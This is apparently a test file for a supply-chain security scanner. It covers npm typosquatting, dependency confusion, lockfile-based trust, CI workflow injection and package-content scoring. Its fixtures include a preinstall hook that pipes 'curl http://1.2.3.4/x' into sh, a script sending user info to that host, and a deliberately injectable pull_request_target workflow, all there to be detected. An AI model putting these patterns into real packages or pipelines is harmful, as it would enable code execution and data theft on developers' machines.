"""Camera-ready behaviour: project baseline, standard references, package model, workflow policy."""
from __future__ import annotations

import io
import json
import tarfile

import pytest
import yaml

from app.attacks import ci_cd_injection as ci
from app.ml.feature_extractor import extract_manifest_features
from app.ml.package_content import features_from_tarball
from app.policy.decision_contract import (
    DEFAULT_RUNTIME_POLICY,
    POLICY_PACKAGE_V3,
    POLICY_WORKFLOW_RULES,
    Action,
    ModelStatus,
)
from app.policy.project_context import lab_context, project_context
from app.services.hybrid_scorer import (
    PackageContentModelProvider,
    StaticModelProvider,
    evaluate_manifest_bundle,
    evaluate_workflow_bundle,
)
from app.schemas.scan_report import DefenseMode


def _tgz(files: dict) -> bytes:
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, text in files.items():
            data = text.encode()
            info = tarfile.TarInfo(f"package/{name}")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


# ── scan context ──────────────────────────────────────────────────────────────

def test_project_context_trusts_only_the_projects_lockfile():
    lock = {"lockfileVersion": 3, "packages": {"": {}, "node_modules/express": {
        "version": "4.19.2", "resolved": "https://registry.npmjs.org/express/-/express-4.19.2.tgz"}}}
    ctx = project_context(lock, None)
    assert "express" in ctx.baseline.trusted_packages
    assert "training-leder" not in ctx.baseline.trusted_packages  # the demo squatter is not trusted
    assert "react" in ctx.baseline.canonical_names  # popular reference present for similarity
    assert "react" not in ctx.baseline.trusted_packages  # ... but popularity is not trust


def test_lab_context_is_the_demo_baseline():
    assert lab_context().mode == "lab"
    assert "training-ledger" in lab_context().baseline.trusted_packages


def test_typosquat_of_popular_package_sets_high_confidence_slot():
    v = extract_manifest_features({"expresss": "1.0.0"}, context=project_context())["vector_dict"]
    assert v["typosquat_high"] == 1.0
    exact = extract_manifest_features({"express": "4.19.2"}, context=project_context())["vector_dict"]
    assert exact["typosquat_high"] == 0.0


def test_public_high_version_signal():
    v = extract_manifest_features({"some-lib": "99.10.9"}, context=project_context())["vector_dict"]
    assert v["public_high_version"] == 1.0
    ok = extract_manifest_features({"some-lib": "9.1.0"}, context=project_context())["vector_dict"]
    assert ok["public_high_version"] == 0.0


def test_confusion_requires_declared_namespace_and_public_resolution():
    lock = {"packages": {"node_modules/@acme/ledger": {
        "version": "9.9.9", "resolved": "https://registry.npmjs.org/@acme/ledger/-/ledger-9.9.9.tgz"}}}
    deps = {"@acme/ledger": "9.9.9"}
    undeclared = extract_manifest_features(deps, context=project_context(lock, None))
    assert undeclared["vector_dict"]["dep_confusion_signal"] == 0.0
    declared = project_context(lock, ["@acme/"])
    feat = extract_manifest_features(deps, context=declared)
    assert feat["vector_dict"]["dep_confusion_signal"] == 0.5
    bundle = evaluate_manifest_bundle(deps, DefenseMode.HYBRID, context=declared,
                                      provider=StaticModelProvider(0.01, ModelStatus.LOADED))
    assert bundle.verdict.action is Action.BLOCK  # mandatory: the ML score cannot dilute it


def test_internal_name_from_internal_registry_is_not_confusion():
    lock = {"packages": {"node_modules/@acme/ledger": {
        "version": "1.4.2", "resolved": "https://npm.acme.internal/@acme/ledger/-/ledger-1.4.2.tgz"}}}
    feat = extract_manifest_features({"@acme/ledger": "1.4.2"}, context=project_context(lock, ["@acme/"]))
    assert feat["vector_dict"]["dep_confusion_signal"] == 0.0


# ── workflow layer ────────────────────────────────────────────────────────────

VULNERABLE_YAML = """
name: pr
on:
  pull_request_target:
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "${{ github.event.pull_request.title }}"
"""


def test_yaml_on_key_is_read_as_triggers():
    wf = yaml.safe_load(VULNERABLE_YAML)
    assert True in wf  # PyYAML turns `on` into True
    assert "pull_request_target" in ci.parse_workflow(wf).triggers


def test_workflow_layer_is_rules_only_and_critical_blocks():
    bundle = evaluate_workflow_bundle(yaml.safe_load(VULNERABLE_YAML), DefenseMode.HYBRID)
    assert bundle.verdict.policy_version == POLICY_WORKFLOW_RULES.policy_version
    assert bundle.verdict.ml_score is None
    assert bundle.verdict.action is Action.BLOCK


# ── package model ─────────────────────────────────────────────────────────────

def test_default_policy_is_the_package_policy_and_matches_model_sidecar():
    from app.ml.package_model import default_ensemble

    assert DEFAULT_RUNTIME_POLICY is POLICY_PACKAGE_V3
    ens = default_ensemble()
    assert ens is not None, "research/scripts/05 must have exported the package model"
    pol = ens.metadata["policy"]
    assert pol["rule_weight"] == POLICY_PACKAGE_V3.rule_weight
    assert pol["warn"] == POLICY_PACKAGE_V3.warn_threshold
    assert pol["block"] == POLICY_PACKAGE_V3.block_threshold


def test_content_features_read_install_script_without_executing():
    pkg = {"package.json": json.dumps({"name": "x", "version": "1.0.0",
                                        "scripts": {"preinstall": "node index.js"}}),
           "index.js": "require('child_process').exec('curl http://1.2.3.4/x | sh')"}
    feats = features_from_tarball(_tgz(pkg))
    assert feats["presence of installation script"] == 1.0
    assert feats[".js"] == 1.0 and feats["IP_x"] >= 1.0


def test_package_provider_scores_fetched_archives_and_fails_closed():
    malicious = _tgz({"package.json": json.dumps({"name": "evil", "version": "1.0.0",
                                                  "scripts": {"preinstall": "node i.js"}}),
                      "i.js": "const d=require('os').userInfo();require('https').request({host:'1.2.3.4'})"})
    provider = PackageContentModelProvider(fetcher=lambda n, v: malicious)
    inf = provider.infer_packages({"evil": "1.0.0"}, [0.0] * 11)
    assert inf.model_status is ModelStatus.LOADED and 0.0 <= inf.ml_score <= 1.0

    unreachable = PackageContentModelProvider(fetcher=lambda n, v: None)
    bundle = evaluate_manifest_bundle({"left-pad": "1.3.0"}, DefenseMode.HYBRID,
                                      context=project_context(), provider=unreachable)
    assert bundle.verdict.action is Action.HOLD  # never ALLOW when the content could not be read


# ── report grounding ──────────────────────────────────────────────────────────

def test_grounding_flags_identifiers_absent_from_evidence():
    from app.services.report_grounding import check_grounding

    evidence = {"package": "expresss", "version": "1.0.0", "engine": {"canonical": "express"}}
    good = {"summary": "expresss 1.0.0 is one edit from express.", "recommended_actions": []}
    bad = {"summary": "expresss 1.0.0 matches CVE-2024-12345, see https://evil.example/x",
           "recommended_actions": ["upgrade to 4.19.2"]}
    assert check_grounding(good, evidence)["grounded"] is True
    tokens = {u["token"] for u in check_grounding(bad, evidence)["ungrounded"]}
    assert {"CVE-2024-12345", "https://evil.example/x", "4.19.2"} <= tokens


def test_trust_attaches_to_the_locked_artifact_not_the_name():
    lock = {"packages": {"node_modules/left-pad": {"version": "1.3.0",
                                                   "resolved": "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"}}}
    ctx = project_context(lock, None)
    pinned = extract_manifest_features({"left-pad": "1.3.0"}, context=ctx)["vector_dict"]
    newer = extract_manifest_features({"left-pad": "1.4.0"}, context=ctx)["vector_dict"]
    assert pinned["exact_trusted_match"] == 1.0
    assert newer["exact_trusted_match"] == 0.0

    suspicious = StaticModelProvider(0.9, ModelStatus.LOADED)
    kept = evaluate_manifest_bundle({"left-pad": "1.3.0"}, DefenseMode.HYBRID, context=ctx, provider=suspicious)
    changed = evaluate_manifest_bundle({"left-pad": "1.4.0"}, DefenseMode.HYBRID, context=ctx, provider=suspicious)
    assert kept.verdict.action is Action.ALLOW  # the already-vetted artifact
    assert changed.verdict.action is Action.BLOCK  # a new release is judged on its content


def test_lab_squatter_denylist_is_not_applied_to_project_scans():
    from app.attacks.typosquatting import scan_manifest

    ctx = project_context()
    hits = scan_manifest({"training-leder": "1.0.0"}, baseline=ctx.baseline, use_policy_denylist=False)
    assert all(f["detection_basis"] != "policy_denylist" for f in hits.findings)


def test_rules_only_mode_decides_without_a_model():
    """Rules-only mode (warn 0.45 / block 0.75) must never hold for lack of a model."""
    from app.policy.decision_contract import POLICY_RULES_ONLY

    ctx = project_context()
    clean = evaluate_manifest_bundle({"left-pad": "1.3.0"}, DefenseMode.BASELINE, context=ctx)
    squat = evaluate_manifest_bundle({"expresss": "1.0.0"}, DefenseMode.BASELINE, context=ctx)
    assert clean.verdict.policy_version == POLICY_RULES_ONLY.policy_version
    assert clean.verdict.action is Action.ALLOW
    assert squat.verdict.action is Action.BLOCK  # typosquat floor 0.88 >= 0.75


def test_lab_mode_scores_the_laboratory_fixtures_from_disk():
    """The demo attack packages exist only locally; lab mode must score them, not hold."""
    from app.services.package_fetcher import lab_fixture_tarball

    assert lab_fixture_tarball("training-leder", "1.0.0") is not None
    assert lab_fixture_tarball("training-leder", "9.9.9") is None  # exact version only
    offline = PackageContentModelProvider(fetcher=lambda n, v: None)
    squat = evaluate_manifest_bundle({"training-leder": "1.0.0"}, DefenseMode.HYBRID,
                                     context=lab_context(), provider=offline)
    assert squat.verdict.model_status is ModelStatus.LOADED
    assert squat.verdict.action is Action.BLOCK


def test_package_scores_are_cached_per_name_and_version():
    calls = {"n": 0}
    archive = _tgz({"package.json": json.dumps({"name": "cachetest", "version": "1.0.0"}), "a.js": "var x=1"})

    def counting_fetch(name, version):
        calls["n"] += 1
        return archive

    provider = PackageContentModelProvider(fetcher=counting_fetch)
    first = provider.package_probability("cachetest", "1.0.0")
    second = provider.package_probability("cachetest", "1.0.0")
    assert first == second and calls["n"] == 1
    provider.package_probability("cachetest", "1.0.1")  # a different version is scored anew
    assert calls["n"] == 2


def test_manifest_fuses_rule_and_ml_per_package_not_across_packages():
    """Package A's rule signal must not be combined with package B's content score."""
    scores = {"has-like": 0.05, "content-heavy": 0.42}

    class PerPackage(PackageContentModelProvider):
        def __init__(self):
            super().__init__(fetcher=lambda n, v: None)

        def package_probability(self, name, version):
            return scores.get(name, 0.05)

    ctx = project_context()
    # "expresss" carries the typosquat floor (0.88) but benign content (ML 0.05);
    # "content-heavy" has no rule signal and ML 0.42. Neither alone reaches the block cut.
    scores["expresss"] = 0.05
    bundle = evaluate_manifest_bundle({"expresss": "1.0.0", "content-heavy": "1.0.0"},
                                      DefenseMode.HYBRID, context=ctx, provider=PerPackage())
    assert bundle.verdict.action is not Action.BLOCK
    assert "typosquatting" in bundle.triggers  # the signal is still reported
    # the same typosquat with suspicious content of its own is blocked
    scores["expresss"] = 0.9
    bundle = evaluate_manifest_bundle({"expresss": "1.0.0", "content-heavy": "1.0.0"},
                                      DefenseMode.HYBRID, context=ctx, provider=PerPackage())
    assert bundle.verdict.action is Action.BLOCK


def test_npm_version_ranges_follow_npm_semantics():
    from app.services.package_fetcher import _satisfies

    assert _satisfies((4, 3, 3), "^4") and not _satisfies((5, 0, 0), "^4")
    assert _satisfies((0, 2, 5), "^0.2.3") and not _satisfies((0, 3, 0), "^0.2.3")
    assert _satisfies((1, 2, 9), "~1.2.3") and not _satisfies((1, 3, 0), "~1.2.3")
    assert _satisfies((4, 9, 9), "4.x") and not _satisfies((5, 0, 0), "4.x")
    assert _satisfies((17, 0, 2), ">=16 <18") and not _satisfies((18, 0, 0), ">=16 <18")
    assert _satisfies((2, 0, 0), "^1 || ^2")
    assert _satisfies((1, 0, 0), "latest") is None  # unsupported: never guessed


def test_parallel_feature_extraction_equals_sequential(monkeypatch):
    from app.ml import package_content as pc

    files = [(f"package/lib/f{i}.js", f"var a{i} = 'k{i}' + \"{'x' * i}\"; eval(b[{i}]);".encode())
             for i in range(12)]
    files.append(("package/package.json", json.dumps({"name": "p", "version": "1.0.0"}).encode()))
    monkeypatch.setattr(pc, "PARALLEL_JS_BYTES", 10**12)
    sequential = pc.features_from_files(files)
    monkeypatch.setattr(pc, "PARALLEL_JS_BYTES", 0)
    assert pc.features_from_files(files) == sequential


def test_name_signal_on_allowed_package_is_reported_low_but_attack_stays_high():
    from app.schemas.scan_report import Severity
    from app.services.hybrid_scorer import set_model_provider
    from app.services.scan_service import scan_manifest_unified

    scores = {"expresss": 0.05, "react": 0.05}

    class PerPackage(PackageContentModelProvider):
        def __init__(self):
            super().__init__(fetcher=lambda n, v: None)

        def package_probability(self, name, version):
            return scores.get(name, 0.05)

    set_model_provider(PerPackage())
    ctx = project_context()
    report = scan_manifest_unified({"expresss": "1.0.0", "react": "18.3.1"}, "t", DefenseMode.HYBRID, ctx)
    squat = [f for f in report.findings if f.attack_type == "typosquatting"]
    assert squat and all(f.severity is Severity.LOW for f in squat)
    scores["expresss"] = 0.9  # the same name with malicious content: the finding keeps its severity
    report = scan_manifest_unified({"expresss": "1.0.0", "react": "18.3.1"}, "t", DefenseMode.HYBRID, ctx)
    squat = [f for f in report.findings if f.attack_type == "typosquatting"]
    assert squat and all(f.severity is not Severity.LOW for f in squat)


def test_install_check_scores_package_content_instead_of_holding_everything():
    """The lab install hook must read each package's content, not refuse every install."""
    from app.services.hybrid_scorer import set_model_provider
    from app.services.protection_service import evaluate_package

    set_model_provider(PackageContentModelProvider(fetcher=lambda n, v: None))
    internal = evaluate_package("corp-internal-ledger-api", "1.4.2")
    confused = evaluate_package("corp-internal-ledger-api", "9.9.9")
    squat = evaluate_package("training-leder", "1.0.0")
    assert internal["engine"]["model_status"] == "loaded"
    assert internal["blocked"] is False  # the trusted internal release installs
    assert confused["blocked"] is True and squat["blocked"] is True


def test_resolving_to_the_internal_source_is_not_a_confusion_signal():
    feat = extract_manifest_features({"corp-internal-ledger-api": "1.4.2"}, context=lab_context())
    assert feat["vector_dict"]["dep_confusion_signal"] == 0.0
    feat = extract_manifest_features({"corp-internal-ledger-api": "9.9.9"}, context=lab_context())
    assert feat["vector_dict"]["dep_confusion_signal"] > 0.0


def test_linked_package_is_recorded_with_its_version_not_its_path(tmp_path):
    from app.services.baseline_builder import _linked_version

    pkg = tmp_path / "packages" / "lib"
    pkg.mkdir(parents=True)
    (pkg / "package.json").write_text(json.dumps({"name": "lib", "version": "2.3.4"}), encoding="utf-8")
    lock = tmp_path / "app" / "package-lock.json"
    lock.parent.mkdir()
    assert _linked_version(lock, "../packages/lib") == "2.3.4"
    assert _linked_version(lock, "https://registry.npmjs.org/lib/-/lib-1.0.0.tgz") is None
